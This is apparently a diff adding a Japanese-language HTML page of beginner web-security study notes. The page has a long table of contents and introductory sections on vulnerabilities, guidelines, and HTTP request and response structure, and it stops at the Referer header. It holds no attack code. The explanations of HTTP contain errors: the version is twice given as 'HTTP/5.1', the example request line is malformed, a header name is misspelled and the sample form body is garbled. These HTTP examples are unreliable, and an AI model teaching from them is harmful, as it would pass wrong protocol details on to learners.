@@ -1,0 +1,1372 @@
+<!DOCTYPE html>
+<html lang="Ja">
+    <head>
+        <title>ゆーろんのWeb系の学習資料　|　Webセキュリティの基礎</title>
+        <!-- OGP -->
+        <head prefix="og: https://ogp.me/ns#">
+        <meta property="og:url" content="https://yuron3141.github.io/my_web_docs/" />
+        <meta property="og:type" content="Blog" />
+        <meta property="og:title" content="Webセキュリティの基礎" />
+        <meta property="og:description" content="ゆーろんのWeb系学習資料です。皆さんの開発のために役立つことを祈っています。" />
+        <meta property="og:site_name" content="ゆーろんアカデミー　ノート支部" />
+        <!-- DOCUMENTS STYLE -->
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+        <!-- ORIGINAL CSS -->
+        <link rel="stylesheet" href="../css/style.css" type="text/css">
+    </head>
+    <body>
+        <body class="d-flex flex-column h-100">
+            <header class="d-flex align-items-center pb-3 mb-5 border-bottom">
+                <div>
+                    <h1 class="m-3">Webセキュリティの基礎</h1>
+                </div>
+            </header>
+            <main class="m-4">
+
+                <!-- Write Text Here-->
+
+                <p>　この項目を学ぶことでWebアプリケーションを作る際に気を付けるべき脆弱性の問題やセキュリティの問題、それらに関する各技術の基礎知識を学習することができます。</p>
+                <h2 id="目次">目次<!-- omit in toc --></h2>
+                <ul>
+                <li><a href="#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%81%AE%E5%9F%BA%E7%A4%8E">セキュリティの基礎</a><ul>
+                <li><a href="#1%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB">1.はじめに</a><ul>
+                <li><a href="#11-%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E5%95%8F%E9%A1%8C%E5%8E%9F%E7%90%86">1.1 脆弱性の問題原理</a></li>
+                <li><a href="#12-%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%8C%E7%94%9F%E3%81%98%E3%82%8B%E5%88%86%E3%81%91">1.2 脆弱性が生じる分け</a></li>
+                <li><a href="#13-%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%90%E3%82%B0%E3%81%A8%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E6%A9%9F%E8%83%BD">1.3 セキュリティバグとセキュリティ機能</a></li>
+                <li><a href="#14-%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%82%AC%E3%82%A4%E3%83%89%E3%83%A9%E3%82%A4%E3%83%B3">1.4 セキュリティガイドライン</a></li>
+                </ul>
+                </li>
+                <li><a href="#2http%E3%81%A8%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E7%AE%A1%E7%90%86">2.HTTPとセッション管理</a><ul>
+                <li><a href="#21-http">2.1 HTTP</a></li>
+                <li><a href="#22-http%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88">2.2 HTTPリクエスト</a></li>
+                <li><a href="#23-http%E3%83%AC%E3%82%B9%E3%83%9D%E3%83%B3%E3%82%B9">2.3 HTTPレスポンス</a></li>
+                <li><a href="#24-httppost%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E5%85%A5%E5%8A%9B%E7%A2%BA%E8%AA%8D%E7%99%BB%E9%8C%B2%E3%83%91%E3%82%BF%E3%83%BC%E3%83%B3">2.4 HTTP　POSTメソッドにおける「入力・確認・登録」パターン</a></li>
+                <li><a href="#25-get%E3%81%A8post%E3%81%AE%E4%BD%BF%E3%81%84%E5%88%86%E3%81%91">2.5 GETとPOSTの使い分け</a></li>
+                <li><a href="#26-hidden%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E3%81%AE%E5%8D%B1%E9%99%BA%E6%80%A7">2.6 hiddenパラメータの危険性</a></li>
+                <li><a href="#27-http%E8%AA%8D%E8%A8%BC">2.7 HTTP認証</a></li>
+                <li><a href="#28-cookie%E3%81%A8%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E7%AE%A1%E7%90%86">2.8 Cookieとセッション管理</a><ul>
+                <li><a href="#cookie%E3%81%AB%E3%82%88%E3%82%8B%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E7%AE%A1%E7%90%86">Cookieによるセッション管理</a></li>
+                <li><a href="#cookie%E3%81%AE%E7%A8%AE%E9%A1%9E">Cookieの種類</a></li>
+                <li><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3id%E3%81%AE%E5%9B%BA%E5%AE%9A%E5%8C%96%E6%94%BB%E6%92%83sfa">セッションIDの固定化攻撃(SFA)</a></li>
+                <li><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3id%E6%BC%8F%E6%B4%A9%E3%81%AE%E5%8E%9F%E5%9B%A0">セッションID漏洩の原因</a></li>
+                <li><a href="#cookie%E3%81%AE%E5%B1%9E%E6%80%A7">Cookieの属性</a></li>
+                <li><a href="#cookie%E3%81%AEdomain%E5%B1%9E%E6%80%A7">CookieのDomain属性</a></li>
+                <li><a href="#cookie%E3%81%AEsecure%E5%B1%9E%E6%80%A7">CookieのSecure属性</a></li>
+                <li><a href="#cookie%E3%81%AEhttponly%E5%B1%9E%E6%80%A7">CookieのHttpOnly属性</a></li>
+                <li><a href="#cookie%E3%81%AEsamesite%E5%B1%9E%E6%80%A7">CookieのSameSite属性</a></li>
+                </ul>
+                </li>
+                </ul>
+                </li>
+                <li><a href="#3%E5%8F%97%E5%8B%95%E6%94%BB%E6%92%83%E3%81%A8%E5%90%8C%E4%B8%80%E3%82%AA%E3%83%AA%E3%82%B8%E3%83%B3%E3%83%9D%E3%83%AA%E3%82%B7">3.受動攻撃と同一オリジンポリシ</a><ul>
+                <li><a href="#31-%E8%83%BD%E5%8B%95%E6%94%BB%E6%92%83%E3%81%A8%E5%8F%97%E5%8B%95%E6%94%BB%E6%92%83">3.1 能動攻撃と受動攻撃</a><ul>
+                <li><a href="#%E8%83%BD%E5%8B%95%E6%94%BB%E6%92%83">能動攻撃</a></li>
+                <li><a href="#%E5%8F%97%E5%8B%95%E6%94%BB%E6%92%83">受動攻撃</a><ul>
+                <li><a href="#%E5%8D%98%E7%B4%94%E3%81%AA%E5%8F%97%E5%8B%95%E6%94%BB%E6%92%83">単純な受動攻撃</a></li>
+                <li><a href="#%E6%AD%A3%E8%A6%8F%E3%82%B5%E3%82%A4%E3%83%88%E3%82%92%E6%82%AA%E7%94%A8%E3%81%97%E3%81%9F%E5%8F%97%E5%8B%95%E6%94%BB%E6%92%83">正規サイトを悪用した受動攻撃</a></li>
+                <li><a href="#%E3%82%B5%E3%82%A4%E3%83%88%E3%82%92%E3%81%BE%E3%81%9F%E3%81%8C%E3%81%A3%E3%81%9F%E5%8F%97%E5%8B%95%E6%94%BB%E6%92%83">サイトをまたがった受動攻撃</a></li>
+                </ul>
+                </li>
+                </ul>
+                </li>
+                <li><a href="#32-%E3%83%96%E3%83%A9%E3%82%A6%E3%82%B6%E3%81%A7%E5%8F%97%E5%8B%95%E6%94%BB%E6%92%83%E3%82%92%E9%98%B2%E3%81%90%E6%96%B9%E6%B3%95">3.2 ブラウザで受動攻撃を防ぐ方法</a><ul>
+                <li><a href="#%E3%83%96%E3%83%A9%E3%82%A6%E3%82%B6%E3%81%A7%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E6%A9%9F%E8%83%BD">ブラウザでのセキュリティ機能</a></li>
+                <li><a href="#%E5%90%8C%E4%B8%80%E3%82%AA%E3%83%AA%E3%82%B8%E3%83%B3%E3%83%9D%E3%83%AA%E3%82%B7">同一オリジンポリシ</a></li>
+                <li><a href="#%E5%90%8C%E4%B8%80%E3%82%AA%E3%83%AA%E3%82%B8%E3%83%B3%E3%81%A7%E3%81%82%E3%82%8B%E6%9D%A1%E4%BB%B6">同一オリジンである条件</a></li>
+                <li><a href="#%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%A8%E5%8F%97%E5%8B%95%E6%94%BB%E6%92%83">アプリケーション脆弱性と受動攻撃</a></li>
+                </ul>
+                </li>
+                <li><a href="#33-javascript%E4%BB%A5%E5%A4%96%E3%81%A7%E3%81%AE%E3%82%AF%E3%83%AD%E3%82%B9%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9">3.3 JavaScript以外でのクロスドメインアクセス</a><ul>
+                <li><a href="#frame%E8%A6%81%E7%B4%A0%E3%81%A8iframe%E8%A6%81%E7%B4%A0">frame要素とiframe要素</a></li>
+                <li><a href="#img%E8%A6%81%E7%B4%A0">img要素</a></li>
+                <li><a href="#script%E8%A6%81%E7%B4%A0">script要素</a></li>
+                <li><a href="#css">CSS</a></li>
+                <li><a href="#form%E8%A6%81%E7%B4%A0%E3%81%AEaction%E5%B1%9E%E6%80%A7">form要素のaction属性</a></li>
+                </ul>
+                </li>
+                <li><a href="#34-corscross-origin-resource-sharing">3.4 CORS(Cross Origin Resource Sharing)</a><ul>
+                <li><a href="#%E3%82%B7%E3%83%B3%E3%83%97%E3%83%AB%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88">シンプルリクエスト</a></li>
+                <li><a href="#%E3%83%97%E3%83%AA%E3%83%95%E3%83%A9%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88">プリフライトリクエスト</a></li>
+                <li><a href="#%E8%AA%8D%E8%A8%BC%E6%83%85%E5%A0%B1%E3%82%92%E5%90%AB%E3%82%80%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88">認証情報を含むリクエスト</a></li>
+                </ul>
+                </li>
+                </ul>
+                </li>
+                </ul>
+                </li>
+                <li><a href="#%E6%A9%9F%E8%83%BD%E5%88%A5%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%90%E3%82%B0">機能別のセキュリティバグ</a><ul>
+                <li><a href="#1%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E7%99%BA%E7%94%9F">1.脆弱性の発生</a><ul>
+                <li><a href="#11-%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E5%85%A8%E4%BD%93%E5%83%8F">1.1 脆弱性の全体像</a></li>
+                <li><a href="#12-%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E7%B3%BB%E8%84%86%E5%BC%B1%E6%80%A7">1.2 インジェクション系脆弱性</a></li>
+                </ul>
+                </li>
+                <li><a href="#2-%E5%85%A5%E5%8A%9B%E5%87%A6%E7%90%86%E7%B3%BB%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3">2 入力処理系のセキュリティ</a><ul>
+                <li><a href="#21-%E5%85%A5%E5%8A%9B%E5%87%A6%E7%90%86%E3%81%AE%E6%A4%9C%E8%A8%BC">2.1 入力処理の検証</a></li>
+                <li><a href="#22-%E6%96%87%E5%AD%97%E3%82%A8%E3%83%B3%E3%82%B3%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0%E3%81%AE%E6%A4%9C%E8%A8%BC">2.2 文字エンコーディングの検証</a><ul>
+                <li><a href="#php%E3%81%AE%E5%A0%B4%E5%90%88">●PHPの場合</a></li>
+                <li><a href="#ruby%E3%81%AE%E5%A0%B4%E5%90%88">●Rubyの場合</a></li>
+                <li><a href="#python%E3%81%AE%E5%A0%B4%E5%90%88">●Pythonの場合</a></li>
+                </ul>
+                </li>
+                <li><a href="#23-%E6%96%87%E5%AD%97%E3%82%A8%E3%83%B3%E3%82%B3%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0%E3%81%AE%E5%A4%89%E6%8F%9B">2.3 文字エンコーディングの変換</a></li>
+                <li><a href="#24-%E5%85%A5%E5%8A%9B%E5%80%A4%E3%81%AE%E6%A4%9C%E8%A8%BC">2.4 入力値の検証</a><ul>
+                <li><a href="#%E5%85%A5%E5%8A%9B%E5%80%A4%E6%A4%9C%E8%A8%BC%E3%81%A8%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3">入力値検証とセキュリティ</a></li>
+                <li><a href="#%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%82%BB%E3%83%BC%E3%83%95%E3%81%A8null-byte%E6%94%BB%E6%92%83">バイナリセーフとNull Byte攻撃</a></li>
+                <li><a href="#%E5%88%B6%E5%BE%A1%E6%96%87%E5%AD%97%E3%81%AE%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF">制御文字のチェック</a></li>
+                <li><a href="#%E6%96%87%E5%AD%97%E6%95%B0%E3%81%AE%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF">文字数のチェック</a></li>
+                <li><a href="#%E6%95%B0%E5%80%A4%E3%81%AE%E6%9C%80%E5%A4%A7%E5%80%A4%E6%9C%80%E5%B0%8F%E5%80%A4%E3%81%AE%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF">数値の最大値・最小値のチェック</a></li>
+                <li><a href="#%E3%81%9D%E3%81%AE%E4%BB%96%E3%81%AE%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85">その他の注意事項</a></li>
+                <li><a href="#%E3%81%A9%E3%81%AE%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E3%82%92%E6%A4%9C%E8%A8%BC%E3%81%99%E3%81%B9%E3%81%8D%E3%81%8B">どのパラメータを検証すべきか</a></li>
+                <li><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E9%96%A2%E6%95%B0%E3%81%AE%E5%88%A9%E7%94%A8">正規表現関数の利用</a><ul>
+                <li><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%81%AB%E3%82%88%E3%82%8B%E6%A4%9C%E8%A8%BC1%E8%8B%B1%E6%95%B0%E5%AD%971%E3%81%8B%E3%82%895%E6%96%87%E5%AD%97">正規表現による検証(1):英数字1から5文字</a></li>
+                <li><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%81%AB%E3%82%88%E3%82%8B%E6%A4%9C%E8%A8%BC2%E4%BD%8F%E6%89%80%E6%AC%8430%E6%96%87%E5%AD%97%E4%BB%A5%E5%86%85%E6%94%B9%E8%A1%8C%E3%82%84%E3%82%BF%E3%83%96%E3%81%AE%E7%A6%81%E6%AD%A2">正規表現による検証(2):住所欄{30文字以内∧改行やタブの禁止}</a></li>
+                <li><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%81%AB%E3%82%88%E3%82%8B%E6%A4%9C%E8%A8%BC3%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88%E6%AC%84400%E6%96%87%E5%AD%97%E4%BB%A5%E5%86%85%E6%94%B9%E8%A1%8C%E3%82%BF%E3%83%96%E4%BB%A5%E5%A4%96%E3%81%AE%E5%88%B6%E5%BE%A1%E6%96%87%E5%AD%97%E3%81%AE%E7%A6%81%E6%AD%A2">正規表現による検証(3):コメント欄{400文字以内∧改行タブ以外の制御文字の禁止}</a></li>
+                </ul>
+                </li>
+                <li><a href="#%E5%85%A5%E5%8A%9B%E5%80%A4%E6%A4%9C%E8%A8%BC%E3%81%A8%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%83%AF%E3%83%BC%E3%82%AF">入力値検証とフレームワーク</a></li>
+                </ul>
+                </li>
+                <li><a href="#25-%E5%85%A5%E5%8A%9B%E5%80%A4%E6%A4%9C%E8%A8%BC%E3%81%A8%E5%AE%9F%E8%A3%85%E6%96%B9%E6%B3%95">2.5 入力値検証と実装方法</a></li>
+                </ul>
+                </li>
+                <li><a href="#3-%E8%A1%A8%E7%A4%BA%E5%87%A6%E7%90%86%E3%81%AB%E4%BC%B4%E3%81%86%E5%95%8F%E9%A1%8C">3. 表示処理に伴う問題</a><ul>
+                <li><a href="#31-%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0xss-%E5%9F%BA%E6%9C%AC%E7%B7%A8">3.1 クロスサイトスクリプティング(XSS) 基本編</a><ul>
+                <li><a href="#%E6%A6%82%E8%A6%81">概要</a></li>
+                <li><a href="#xss%E6%94%BB%E6%92%83%E6%89%8B%E6%B3%95%E3%81%A8%E5%BD%B1%E9%9F%BF">XSS攻撃手法と影響</a><ul>
+                <li><a href="#xss%E3%81%AB%E3%82%88%E3%82%8B%E3%82%AF%E3%83%83%E3%82%AD%E3%83%BC%E5%80%A4%E3%81%AE%E7%9B%97%E3%81%BF%E5%87%BA%E3%81%97">●XSSによるクッキー値の盗み出し</a></li>
+                <li><a href="#%E5%8F%97%E5%8B%95%E6%94%BB%E6%92%83%E3%81%AB%E3%82%88%E3%82%8B%E5%88%A5%E4%BA%BA%E3%81%AE%E3%82%AF%E3%83%83%E3%82%AD%E3%83%BC%E5%80%A4%E3%81%AE%E7%9B%97%E3%81%BF%E5%87%BA%E3%81%97">●受動攻撃による別人のクッキー値の盗み出し</a></li>
+                <li><a href="#%E7%94%BB%E9%9D%A2%E3%81%AE%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88">●画面の書き換え</a></li>
+                </ul>
+                </li>
+                <li><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E3%81%A8%E6%8C%81%E7%B6%9A%E5%9E%8Bxss">反射型XSSと持続型XSS</a></li>
+                <li><a href="#xss%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E7%99%BA%E7%94%9F%E5%8E%9F%E5%9B%A0">XSS脆弱性の発生原因</a></li>
+                <li><a href="#xss%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E5%9F%BA%E6%9C%AC%E5%AF%BE%E7%AD%96">XSS脆弱性の基本対策</a></li>
+                <li><a href="#xss%E3%81%AB%E5%AF%BE%E3%81%99%E3%82%8B%E4%BF%9D%E9%99%BA%E7%9A%84%E5%AF%BE%E7%AD%96">XSSに対する保険的対策</a><ul>
+                <li><a href="#x-xss-protection%E3%83%AC%E3%82%B9%E3%83%9D%E3%83%B3%E3%82%B9%E3%83%98%E3%83%83%E3%83%80%E3%81%AE%E4%BD%BF%E7%94%A8">X-XSS-Protectionレスポンスヘッダの使用</a></li>
+                <li><a href="#%E5%85%A5%E5%8A%9B%E5%80%A4%E6%A4%9C%E8%A8%BC">入力値検証</a></li>
+                <li><a href="#%E3%82%AF%E3%83%83%E3%82%AD%E3%83%BC%E3%81%ABhttponly%E5%B1%9E%E6%80%A7%E3%82%92%E4%BB%98%E4%B8%8E%E3%81%99%E3%82%8B">クッキーにHttpOnly属性を付与する</a></li>
+                </ul>
+                </li>
+                <li><a href="#xss%E5%AF%BE%E7%AD%96%E3%81%AE%E3%81%BE%E3%81%A8%E3%82%81">●XSS対策のまとめ</a></li>
+                </ul>
+                </li>
+                <li><a href="#32-%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0xss-%E5%BF%9C%E7%94%A8%E7%B7%A8">3.2 クロスサイトスクリプティング(XSS) 応用編</a><ul>
+                <li><a href="#href%E3%82%84src%E5%B1%9E%E6%80%A7%E3%81%AExss">hrefやsrc属性のXSS</a></li>
+                <li><a href="#javascript%E3%81%AE%E5%8B%95%E7%9A%84%E7%94%9F%E6%88%90">JavaScriptの動的生成</a></li>
+                <li><a href="#html%E3%82%BF%E3%82%B0%E3%82%84css%E3%81%AE%E5%85%A5%E5%8A%9B%E3%82%92%E8%A8%B1%E3%81%99%E5%A0%B4%E5%90%88%E3%81%AE%E5%AF%BE%E7%AD%96">HTMLタグやCSSの入力を許す場合の対策</a></li>
+                </ul>
+                </li>
+                <li><a href="#33-%E3%82%A8%E3%83%A9%E3%83%BC%E3%83%A1%E3%83%83%E3%82%BB%E3%83%BC%E3%82%B8%E3%81%8B%E3%82%89%E3%81%AE%E6%83%85%E5%A0%B1%E6%BC%8F%E6%B4%A9">3.3 エラーメッセージからの情報漏洩</a></li>
+                </ul>
+                </li>
+                <li><a href="#4sql%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E3%81%AB%E4%BC%B4%E3%81%86%E8%84%86%E5%BC%B1%E6%80%A7">4.SQL呼び出しに伴う脆弱性</a><ul>
+                <li><a href="#41-sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3">4.1 SQLインジェクション</a><ul>
+                <li><a href="#%E6%A6%82%E8%A6%81-1">概要</a></li>
+                <li><a href="#%E6%94%BB%E6%92%83%E6%89%8B%E6%B3%95%E3%81%A8%E5%BD%B1%E9%9F%BF">攻撃手法と影響</a></li>
+                </ul>
+                </li>
+                </ul>
+                </li>
+                </ul>
+                </li>
+                </ul>
+                <h1 id="セキュリティの基礎">セキュリティの基礎</h1>
+                <h2 id="1はじめに">1.はじめに</h2>
+                <p>　アプリケーションに何かしらのバグがあると様々な問題を起こす可能性があります。
+                そしてバグの中には悪用ができてしまうものが存在します。そうしたものは<strong>脆弱性</strong>と呼ばれます。</p>
+                <h3 id="11-脆弱性の問題原理">1.1 脆弱性の問題原理</h3>
+                <p>脆弱性が問題となる理由は下記の通りです。</p>
+                <ul>
+                <li>経済的損失の恐れ</li>
+                <li>法的な要求の恐れ</li>
+                <li>利用者が回復不能なダメージを受ける恐れ</li>
+                <li>利用者に安全性に関して保証できなくなる恐れ</li>
+                <li>攻撃インフラ構築に加担してしまう恐れ</li>
+                </ul>
+                <h3 id="12-脆弱性が生じる分け">1.2 脆弱性が生じる分け</h3>
+                <p>脆弱性の発生原因には以下の2種類に分類ができます。</p>
+                <ol>
+                <li><strong>バグによるもの</strong> ・・・ セキュリティに無関係なところに発生しがちである</li>
+                <li><strong>チェック機能の不足によるもの</strong> ・・・ セキュリティチェックが乏しい場合に発生する</li>
+                </ol>
+                <h3 id="13-セキュリティバグとセキュリティ機能">1.3 セキュリティバグとセキュリティ機能</h3>
+                <p>セキュリティ機能は、システムに安全性を強化する機能であり、セキュリティバグはそこから漏れ出した脆弱性(バグ)のことを示します。
+                セキュリティ機能はセキュリティ要件とされシステムの要件定義に組み込まれる場合があります。</p>
+                <h3 id="14-セキュリティガイドライン">1.4 セキュリティガイドライン</h3>
+                <p>Webを利用したアプリケーションやシステムの開発のセキュリティ設計において、いくつかの公的機関がガイドラインを公開しています。
+                これらの資料のいくつかは実際の開発の際に企業や組織で活用されいます。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>資料名</th>
+                <th>URL</th>
+                <th>提供機関</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>安全なウェブサイトの作り方</td>
+                <td><a href="https://www.ipa.go.jp/files/000017316.pdf">https://www.ipa.go.jp/files/000017316.pdf</a></td>
+                <td>IPA</td>
+                </tr>
+                <tr>
+                <td>安全なSQLの呼び出し方</td>
+                <td><a href="https://www.ipa.go.jp/files/000017320.pdf">https://www.ipa.go.jp/files/000017320.pdf</a></td>
+                <td>IPA</td>
+                </tr>
+                <tr>
+                <td>ウェブ健康診断仕様</td>
+                <td><a href="https://www.ipa.go.jp/files/000017319.pdf">https://www.ipa.go.jp/files/000017319.pdf</a></td>
+                <td>IPA</td>
+                </tr>
+                <tr>
+                <td>OWASP Top 10</td>
+                <td><a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></td>
+                <td>OWASP</td>
+                </tr>
+                </tbody></table>
+                <hr>
+                <h2 id="2httpとセッション管理">2.HTTPとセッション管理</h2>
+                <h3 id="21-http">2.1 HTTP</h3>
+                <p>Webアプリケーションの脆弱性には、Web特有の性質に由来するものがあります。
+                Webでは主に<strong>HTTPリクエスト</strong>というWebサーバに対する命令と、<strong>HTTPレスポンス</strong>というWebサーバから返された内容の2つを使って情報のやり取りを行います。</p>
+                <h3 id="22-httpリクエスト">2.2 HTTPリクエスト</h3>
+                <p>HTTPリクエストはブラウザなどからWebサーバに送られた要求であり、構成は以下のようになります。</p>
+                <img src="https://programmer-life.work/wp-content/uploads/2019/12/http_request_message.png" width="60%">
+                
+                <h4 id="httpリクエストライン">HTTPリクエストライン<!-- omit in toc --></h4>
+                <p>HTTPリクエストラインはWebサーバに対する命令に相当する部分であり、構成は以下のようになります。
+                例</p>
+                <pre><code class="language-bash">GET / https://www.yahoo.co.jp HTTP/5.1
+                </code></pre>
+                <p>構造</p>
+                <pre><code class="language-bash">メソッド / URL プロトコル/バージョン
+                </code></pre>
+                <p>HTTPのメソッドには以下のようなものがあります。</p>
+                <ul>
+                <li>GET</li>
+                <li>POST</li>
+                <li>HEAD
+                etc...</li>
+                </ul>
+                <h3 id="23-httpレスポンス">2.3 HTTPレスポンス</h3>
+                <p>HTTPレスポンスはwebサーバから返された内容であり、構成は以下のようになります。</p>
+                <img src="https://image.itmedia.co.jp/ait/articles/1511/27/tcp3_1.gif" width="50%">
+                
+                <h4 id="ステータスラインステータス行">ステータスライン(ステータス行)<!-- omit in toc --></h4>
+                <p>ステータスラインは、リクエストメッセージの処理結果のステータスを返します。構成は以下の通りです。
+                例</p>
+                <pre><code class="language-bash">HTTP/5.1 200 OK
+                </code></pre>
+                <p>構成</p>
+                <pre><code class="language-bash">プロトコル/バージョン ステータスコード テキストフレーズ
+                </code></pre>
+                <p>ステータスコードは100の位に意味を持ち以下表のように分類されます。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>ステータスコード</th>
+                <th>概要</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>1xx</td>
+                <td>処理が継続している</td>
+                </tr>
+                <tr>
+                <td>2xx</td>
+                <td>正常終了</td>
+                </tr>
+                <tr>
+                <td>3xx</td>
+                <td>リダイレクト</td>
+                </tr>
+                <tr>
+                <td>4xx</td>
+                <td>クライアントエラ</td>
+                </tr>
+                <tr>
+                <td>5xx</td>
+                <td>サーバエラ</td>
+                </tr>
+                </tbody></table>
+                <h4 id="レスポンスヘッダヘッダーフィルド">レスポンスヘッダ(ヘッダーフィルド)<!-- omit in toc --></h4>
+                <p>代表的なヘッダに以下なようなものがあります。</p>
+                <ul>
+                <li>Content-Length ・・・ Bodyのバイト数を示す</li>
+                <li>Content-tyle ・・・ MIMEタイプというリソース種類を指定する</li>
+                </ul>
+                <h5 id="主なmimeタイプ">主なMIMEタイプ<!-- omit in toc --></h5>
+                <table>
+                <thead>
+                <tr>
+                <th>MIME Type</th>
+                <th>意味</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>text/plain</td>
+                <td>テキスト</td>
+                </tr>
+                <tr>
+                <td>text/html</td>
+                <td>HTML文書</td>
+                </tr>
+                <tr>
+                <td>application/xml</td>
+                <td>xml文書</td>
+                </tr>
+                <tr>
+                <td>text/css</td>
+                <td>css</td>
+                </tr>
+                <tr>
+                <td>image/gif</td>
+                <td>GIF画像</td>
+                </tr>
+                <tr>
+                <td>image/jpeg</td>
+                <td>jpeg画像</td>
+                </tr>
+                <tr>
+                <td>image/png</td>
+                <td>png画像</td>
+                </tr>
+                <tr>
+                <td>application/pdf</td>
+                <td>pdf文書</td>
+                </tr>
+                </tbody></table>
+                <h3 id="24-http-postメソッドにおける「入力・確認・登録」パターン">2.4 HTTP　POSTメソッドにおける「入力・確認・登録」パターン</h3>
+                <p>「入力・確認・登録」形式の入力フォームのHTTPメッセージを確認します。</p>
+                <h4 id="入力→確認">入力→確認<!-- omit in toc --></h4>
+                <p>入力→確認の遷移におけるHTTPリクエストの内容の抜粋部分の構造例を以下に示します。</p>
+                <p>例</p>
+                <pre><code class="language-bash">POST https://yamot.co.jp/31/31-003.php HTTP/5.1
+                Referer: https://yamot.co.jp/31/31-002.php
+                Content-Type: application/x-www-form-urlencoded
+                Host: yamot.co.jp
+                
+                name=%5E%BE%E3%B8%B5%B8%A9%E4%A4&amp;mail=test&amp;40yamot.co.jp&amp;gender=%5E%BE%E3%B8%B5%B8
+                </code></pre>
+                <h5 id="メッセージボディ">メッセージボディ<!-- omit in toc --></h5>
+                <p>ヘッダとボディは空行で区切られます。
+                HTTPリクエストのボディにはPOSTメソッドにより送信される値が入ります。</p>
+                <h5 id="referer">Referer<!-- omit in toc --></h5>
+                <p>HTTPリクエストのヘッダに「Referer」がつくことがあります。
+                これはリンク元のURLを示すヘッダであり、form要素によるフォーム送信やa要素によるリンク、img要素による画像参照などでつけられます。
+                Refererがセキュリティ上の問題となるケースは、URLに秘密情報を含んでいる場合です。
+                多くの場合、URLにセッションIDが含まれている場合で、Referer経由で外部に漏洩しなりすましに悪用される場合があります。</p>
